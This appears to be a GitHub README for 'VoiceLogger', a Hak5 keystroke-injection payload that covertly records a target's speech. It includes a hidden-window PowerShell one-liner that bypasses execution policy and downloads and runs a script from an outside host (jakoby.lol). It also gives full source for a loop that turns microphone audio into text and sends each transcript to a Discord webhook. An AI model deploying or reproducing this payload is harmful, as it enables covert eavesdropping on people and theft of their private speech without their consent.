![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# VoiceLogger

## Description

This payload activates your target's microphone, converts their speech to text, and exfils it to Discord 
with the optional functionality of incorporating voice activated payloads.

## Getting Started

### Dependencies

* Windows 10,11

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory

`$dc` is the variable that stores your Discord webhook 

```
powershell -w h -NoP -Ep Bypass $dc='';irm jakoby.lol/voiceLogger | iex
```

### The Function

- The voiceLogger function leverages the System.Speech namespace to create a continuous speech-to-text logger. 
- It initializes a speech recognition engine, loads a dictation grammar, and sets the input to the default audio device. 
- The script then enters an infinite loop where it listens for speech input and recognizes the text. 
- The recognized text is written to the output and saved to a temporary log file. 
- The log file content is then uploaded using the DC-Upload function. 
- Additionally, the script checks for specific voice commands using a switch statement with regex patterns: if the word "notepad" is detected, it launches Notepad, 
- and if the word "exit" is detected, it breaks the loop and stops the voice logger. 
- Once the loop is terminated, the log file's content is cleared.

```powershell
function voiceLogger {

    Add-Type -AssemblyName System.Speech
    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $recognizer.LoadGrammar($grammar)
    $recognizer.SetInputToDefaultAudioDevice()

    while ($true) {
        $result = $recognizer.Recognize()
        if ($result) {
            $results = $result.Text
            Write-Output $results
            $log = "$env:tmp/VoiceLog.txt"
            echo $results > $log
            $text = get-content $log -raw
            DC-Upload $text

            # Use a switch statement with the $results variable
            switch -regex ($results) {
                '\bnotepad\b' {saps notepad}
                '\bexit\b' {exit}
            }
        }
    }
    Clear-Content -Path $log
}
```

```mermaid
graph TB;
  A[Start voiceLogger] --> B[Start Listening]
  B --> C{Recognized text?}
  C -->|Yes| D[Write to console]
  D --> E[Save to file]
  E --> F[Send to Discord]
  F --> G{Keyword recognized?}
  G -->|'note'| H[Open Notepad]
  G -->|'exit'| I[Exit function]
  G -->|No keyword| B
  C -->|No| B
  I --> J[Clear Log]
  J --> K[End voiceLogger]
```

<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing

All contributor's names will be listed here

I am Jakoby

<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

* 0.1
    * Initial Release

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<h2 align="center">📱 My Socials 📱</h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
      </a>
      <br>YouTube
    </td>
    <td align="center" width="96">
      <a href="https://twitter.com/I_Am_Jakoby">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
      </a>
      <br>Twitter
    </td>
    <td align="center" width="96">
      <a href="https://www.instagram.com/i_am_jakoby/">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
      </a>
      <br>Instagram
    </td>
    <td align="center" width="96">
      <a href="https://discord.gg/MYYER2ZcJF">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>Discord
    </td>
    <td align="center" width="96">
      <a href="https://www.tiktok.com/@i_am_jakoby?lang=en">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/tiktok.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>TikTok
    </td>    
  </tr>
</table>
</div>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [MG](https://github.com/OMG-MG)

<p align="right">(<a href="#top">back to top</a>)</p>
